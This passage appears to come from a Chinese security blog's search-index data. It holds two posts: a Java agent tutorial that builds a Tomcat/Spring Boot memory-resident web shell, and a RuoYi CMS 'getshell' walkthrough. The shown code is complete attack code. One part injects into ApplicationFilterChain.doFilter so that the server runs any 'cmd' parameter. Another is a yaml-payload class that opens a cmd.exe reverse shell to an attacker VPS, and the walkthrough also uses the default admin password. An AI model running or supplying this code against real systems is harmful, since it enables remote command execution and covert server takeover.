java.lang.instrument.UnmodifiableClassException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">agentmain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">agentmain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class=\"line\">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\">        <span class=\"comment\">// 判断类是否已经加载</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class aClass : classes) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (aClass.getName().equals(definetransform.editClassName)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 添加 Transformer</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> definetransform(), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 触发 Transformer</span></span><br><span class=\"line\">                inst.retransformClasses(aClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// definetransform.java</span></span><br><span class=\"line\"><span class=\"comment\">// 如果在使用过程中找不到javassist包中的类，那么可以使用URLCLassLoader+反射的方式调用</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtMethod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.ProtectionDomain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">definetransform</span> <span class=\"keyword\">implements</span> <span class=\"title\">ClassFileTransformer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editClassName = <span class=\"string\">&quot;hello&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editMethod = <span class=\"string\">&quot;hello&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"keyword\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            ClassPool cp = ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                ClassClassPath ccp = <span class=\"keyword\">new</span> ClassClassPath(classBeingRedefined);</span><br><span class=\"line\">                cp.insertClassPath(ccp);</span><br><span class=\"line\">                CtClass ctc = cp.get(editClassName);</span><br><span class=\"line\">                CtMethod method = ctc.getDeclaredMethod(editMethod);</span><br><span class=\"line\">                String source = <span class=\"string\">&quot;&#123;System.out.println(\\&quot;hello transformer\\&quot;);&#125;&quot;</span>;</span><br><span class=\"line\">                method.setBody(source);</span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] bytes = ctc.toBytecode();</span><br><span class=\"line\">                ctc.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>META-INF/MANIFEST.MF 注意添加 Agent-Class:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\">Agent-Class: agentmain</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>生成jar</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617225517482.png\" alt=\"image-20220617225517482\"></p>\n<p>inject.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.tools.attach.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">inject</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> AgentLoadException, IOException, AttachNotSupportedException, AgentInitializationException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;running JVM start&quot;</span>);</span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        String agent = <span class=\"string\">&quot;agent.jar&quot;</span>;</span><br><span class=\"line\">        Integer i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        String aim = <span class=\"string\">&quot;HelloWorld.jar&quot;</span>;<span class=\"comment\">//你的jar包</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Finding: &quot;</span>+aim);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]Agent jar: &quot;</span>+agent);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (vmd.displayName().contains(aim)) &#123;</span><br><span class=\"line\">                System.out.println(String.format(<span class=\"string\">&quot;[+]find %s, process id %s&quot;</span>, vmd.displayName(), vmd.id()));</span><br><span class=\"line\"></span><br><span class=\"line\">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());  <span class=\"comment\">// 进程id号</span></span><br><span class=\"line\">                virtualMachine.loadAgent(agent);<span class=\"comment\">//你想要加载的agentmain包  loadAgent</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后META-INF/MANIFEST.MF生成jar</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618090327885.png\" alt=\"image-20220618090327885\"></p>\n<p>使用inject.jar，然后java -jar hello.jar成功输出注入的 “hello transformer”</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618090459247.png\" alt=\"image-20220618090459247\"></p>\n<p>下面结合流程分析一下</p>\n<p>第四步</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617153852536.png\" alt=\"image-20220617153852536\"></p>\n<p>这里调用了 loadClassAndStartAgent，会去调用agent的premain或者agentmain方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617154410372.png\" alt=\"image-20220617154410372\"></p>\n<p>那么结合例子就是进入 agentmain 后通过调用 Instrumentation 实例 inst 的addtransformer 双参数方法添加了一个我们自定义的TransformerDemo 转换器，具体实现就是实例化 <strong>TransformerManager(sun.instrument.InstrumentationImpl.class)</strong> 一个对象，调用其 addTransformer 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617155528519.png\" alt=\"image-20220617155528519\"></p>\n<p>实例化一个 TransformerInfo 对象然后存放到数组 <strong>mTransformerList</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617161618908.png\" alt=\"image-20220617161618908\"></p>\n<p>看看 TransformerInfo ，定义一个 <strong>ClassFileTransformer</strong> 类型的转换器然后放到了 <strong>mTransformer</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617161712929.png\" alt=\"image-20220617161712929\"></p>\n<p>最后通过 inst.retransformClasses(aClass) 进行重新的调用</p>\n<p>第六步</p>\n<p>HOOK函数调用了sun.instrument.instrumentationImpl类里的 <strong>transform</strong> 方法，其中调用了 <strong>TransformerManager</strong> 的 <strong>transform</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617163453049.png\" alt=\"image-20220617163453049\"></p>\n<p><strong>先获取转换器list，然后遍历list，通过transformer方法获取转换器，然后调用转换器的transform方法</strong> 也就是我们自定义的转换器中transform中利用javassist修改字节码的恶意方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220617164110344.png\" alt=\"image-20220617164110344\"></p>\n<p>综上，总算是能理解这个 代理 的意思了，java目前通过agent给我们提供了一个可以修改类字节码的入口，至于怎么修改，用什么实现，下面就学习学习 javassist技术</p>\n<h2 id=\"javassist\"><a href=\"#javassist\" class=\"headerlink\" title=\"javassist\"></a>javassist</h2><p>字节码编程直接贴一个链接吧：<a href=\"https://www.w3cschool.cn/article/35230124.html\">关于Java字节码编程javassist的详细介绍</a></p>\n<h2 id=\"内存马实现\"><a href=\"#内存马实现\" class=\"headerlink\" title=\"内存马实现\"></a>内存马实现</h2><h3 id=\"合适方法的寻找\"><a href=\"#合适方法的寻找\" class=\"headerlink\" title=\"合适方法的寻找\"></a>合适方法的寻找</h3><p>现在可以实现修改方法体了，以springboot为例，我们去寻找一个spring中一定会用到的方法，然后修改它的方法插入恶意代码，即可实现利用所以这个类中的方法需要满足两个要求</p>\n<ol>\n<li>该方法一定会被执行</li>\n<li>不会影响正常的业务逻辑</li>\n</ol>\n<p>在 tomcat 中，针对用户的请求，先通过filter后再传入到servlet中，而filter调用的实现在ApplicationFilterChain#doFilter()中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618114854456.png\" alt=\"image-20220618114854456\"></p>\n<p>其中会调用 internalDoFilter()方法去实现真正的filter调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618115224539.png\" alt=\"image-20220618115224539\"></p>\n<p>综上，两个方法 doFilter 和 internalDoFilter 都是可以进行插入恶意代码的，而且还有request和 response，可以获取用户请求并将执行结果返回，堪称完美，当然肯定还有其他的 hook方法，比如：Servlet-API 中更具有通用性的  javax.servlet.http.HttpServlet 的 service 方法、Tomcat中默认存在的Filter：WsFilter等等</p>\n<h3 id=\"注入测试\"><a href=\"#注入测试\" class=\"headerlink\" title=\"注入测试\"></a>注入测试</h3><p>springboot 一个正常 /books 路由，一个fastjson反序列化路由/ fastjson</p>\n<p>注意点：</p>\n<ul>\n<li>Tomcat运行时环境是JRE环境，没有tools.jar，可以通过反射+URLClassLoader加载</li>\n</ul>\n<p>agent.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//agentmain.java</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.Instrumentation;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">agentmain</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">agentmain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class=\"line\">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class=\"line\">        <span class=\"comment\">// 判断类是否已经加载</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class aClass : classes) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (aClass.getName().equals(definetransform.editClassName)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 添加 Transformer</span></span><br><span class=\"line\">                inst.addTransformer(<span class=\"keyword\">new</span> definetransform(), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 触发 Transformer</span></span><br><span class=\"line\">                inst.retransformClasses(aClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//definetransform.java</span></span><br><span class=\"line\"><span class=\"comment\">//写shell的实现</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtMethod;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.ProtectionDomain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">definetransform</span> <span class=\"keyword\">implements</span> <span class=\"title\">ClassFileTransformer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editClassName = <span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//public static final String editClassName = &quot;org.apache.tomcat.websocket.server.WsFilter&quot;;</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String editMethod = <span class=\"string\">&quot;doFilter&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"keyword\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            ClassPool cp = ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (classBeingRedefined != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                ClassClassPath ccp = <span class=\"keyword\">new</span> ClassClassPath(classBeingRedefined);</span><br><span class=\"line\">                cp.insertClassPath(ccp);</span><br><span class=\"line\">                CtClass ctc = cp.get(editClassName);</span><br><span class=\"line\">                CtMethod method = ctc.getDeclaredMethod(editMethod);</span><br><span class=\"line\">                String source = <span class=\"string\">&quot;javax.servlet.http.HttpServletRequest req =  request;\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;javax.servlet.http.HttpServletResponse res = response;\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;java.lang.String cmd = request.getParameter(\\&quot;cmd\\&quot;);\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;if(cmd != null)&#123;\\n&quot;</span>+</span><br><span class=\"line\">                        <span class=\"string\">&quot;   try &#123;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        String line;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        StringBuilder sb = new StringBuilder(\\&quot;\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        while ((line=reader.readLine()) != null)&#123;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;            sb.append(line).append(\\&quot;\\\\n\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        &#125;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        response.getOutputStream().print(sb.toString());\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        response.getOutputStream().flush();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        response.getOutputStream().close();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;    &#125; catch (Exception e)&#123;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        e.printStackTrace();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;    &#125;\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">                method.insertBefore(source);</span><br><span class=\"line\">                <span class=\"keyword\">byte</span>[] bytes = ctc.toBytecode();</span><br><span class=\"line\">                ctc.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>inject.java 将注入写到static代码块，编译为class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLClassLoader;</span><br><span class=\"line\"><span class=\"comment\">//agent的注入</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">inject</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        String agentpath = <span class=\"string\">&quot;C:\\\\Users\\\\cys\\\\Desktop\\\\memoryshell\\\\agent.jar&quot;</span>;</span><br><span class=\"line\">        String toolsjarpath = System.getProperty(<span class=\"string\">&quot;java.home&quot;</span>).replace(<span class=\"string\">&quot;jre&quot;</span>,<span class=\"string\">&quot;lib&quot;</span>) + File.separator + <span class=\"string\">&quot;tools.jar&quot;</span>;</span><br><span class=\"line\">        File toolsjar = <span class=\"keyword\">new</span> File(toolsjarpath);</span><br><span class=\"line\">        URL url = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            url = toolsjar.toURI().toURL();</span><br><span class=\"line\">            URLClassLoader urlClassLoader = <span class=\"keyword\">new</span> URLClassLoader(<span class=\"keyword\">new</span> URL[]&#123;url&#125;, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 加载virtualmachine</span></span><br><span class=\"line\">            Class&lt;?&gt; virtualMachine = urlClassLoader.loadClass(<span class=\"string\">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class=\"line\">            Class&lt;?&gt; VirtualMachineDescriptor = urlClassLoader.loadClass(<span class=\"string\">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class=\"line\">            java.lang.reflect.Method listMethod = virtualMachine.getDeclaredMethod(<span class=\"string\">&quot;list&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;&#125;);</span><br><span class=\"line\">            java.util.List&lt;Object&gt; pidlist = (java.util.List&lt;Object&gt;) listMethod.invoke(<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; pidlist.size(); i++) &#123;</span><br><span class=\"line\">                Object o = pidlist.get(i);</span><br><span class=\"line\">                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod(<span class=\"string\">&quot;displayName&quot;</span>);</span><br><span class=\"line\">                Object name = displayName.invoke(o, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\">                <span class=\"comment\">// 0x04 找到Tomcat进程，attach</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (name.toString().contains(<span class=\"string\">&quot;com.example.SpringbootApplication&quot;</span>)) &#123;</span><br><span class=\"line\">                    java.lang.reflect.Method attach = virtualMachine.getDeclaredMethod(<span class=\"string\">&quot;attach&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;VirtualMachineDescriptor&#125;);</span><br><span class=\"line\">                    <span class=\"comment\">// 这里调的attch重载方法，attach可以通过pid也可通过相关jvm进程的vrtualMachineDescriptor对象传参</span></span><br><span class=\"line\">                    Object machin = attach.invoke(virtualMachine, <span class=\"keyword\">new</span> Object[]&#123;o&#125;);</span><br><span class=\"line\">                    <span class=\"comment\">// 0x05 loadAgent</span></span><br><span class=\"line\">                    java.lang.reflect.Method loadAgent = machin.getClass().getSuperclass().getSuperclass().getDeclaredMethod(<span class=\"string\">&quot;loadAgent&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;);</span><br><span class=\"line\">                    loadAgent.invoke(machin, <span class=\"keyword\">new</span> Object[]&#123;agentpath&#125;);</span><br><span class=\"line\">                    <span class=\"comment\">//0x06 detach</span></span><br><span class=\"line\">                    java.lang.reflect.Method detach = virtualMachine.getDeclaredMethod(<span class=\"string\">&quot;detach&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;&#125;);</span><br><span class=\"line\">                    detach.invoke(machin, <span class=\"keyword\">new</span> Object[]&#123;&#125;);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> fastjson的JNDI注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220618155959790.png\" alt=\"image-20220618155959790\"></p>\n<p>结合反序列化，JNDI注入可以做到无文件落地的内存马注入</p>\n<h2 id=\"参考-2\"><a href=\"#参考-2\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://xz.aliyun.com/t/9450\">Java Agent 从入门到内存马</a></p>\n","categories":["JavaSec"]},{"title":"windows下若依CMS后台getshell","url":"/2023/12/25/%E8%8B%A5%E4%BE%9DCMS%E5%90%8E%E5%8F%B0getshell/","content":"<h1 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h1><p>默认账号密码：admin admin123登入后台，下载yaml反序列化exp，<a href=\"https://github.com/artsploit/yaml-payload\">artsploit/yaml-payload</a></p>\n<p>由于这个站是windows，稍微修改一下 <code>AwesomeScriptEngineFactory.java</code></p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">package artsploit;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.script.ScriptEngine;</span><br><span class=\"line\">import javax.script.ScriptEngineFactory;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public AwesomeScriptEngineFactory() throws java.io.IOException, InterruptedException &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            String host&#x3D;&quot;xxx&quot;;  &#x2F;&#x2F;vps ip</span><br><span class=\"line\">            int port&#x3D;9000;  &#x2F;&#x2F;vps port</span><br><span class=\"line\">            String cmd&#x3D;&quot;cmd.exe&quot;;</span><br><span class=\"line\">            Process p&#x3D;new ProcessBuilder(cmd).redirectErrorStream(true).start();</span><br><span class=\"line\">            java.net.Socket s&#x3D;new java.net.Socket(host,port);</span><br><span class=\"line\">            java.io.InputStream pi&#x3D;p.getInputStream(),pe&#x3D;p.getErrorStream(),si&#x3D;s.getInputStream();</span><br><span class=\"line\">            java.io.OutputStream po&#x3D;p.getOutputStream(),so&#x3D;s.getOutputStream();</span><br><span class=\"line\">            while(!s.isClosed()) &#123;</span><br><span class=\"line\">                while(pi.available()&gt;0) &#123;</span><br><span class=\"line\">                    so.write(pi.read());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                while(pe.available()&gt;0) &#123;</span><br><span class=\"line\">                    so.write(pe.read());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                while(si.available()&gt;0) &#123;</span><br><span class=\"line\">                    po.write(si.read());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                so.flush();</span><br><span class=\"line\">                po.flush();</span><br><span class=\"line\">                Thread.sleep(50);</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    p.exitValue();</span><br><span class=\"line\">                    break;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                catch (Exception e)&#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            p.destroy();</span><br><span class=\"line\">            s.close();</span><br><span class=\"line\">        &#125; catch (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getEngineName() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getEngineVersion() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public List&lt;String&gt; getExtensions() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public List&lt;String&gt; getMimeTypes() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public List&lt;String&gt; getNames() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getLanguageName() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getLanguageVersion() &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public Object getParameter(String key) &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getMethodCallSyntax(String obj, String m, String... args) &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String getOutputStatement(String toDisplay) &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span 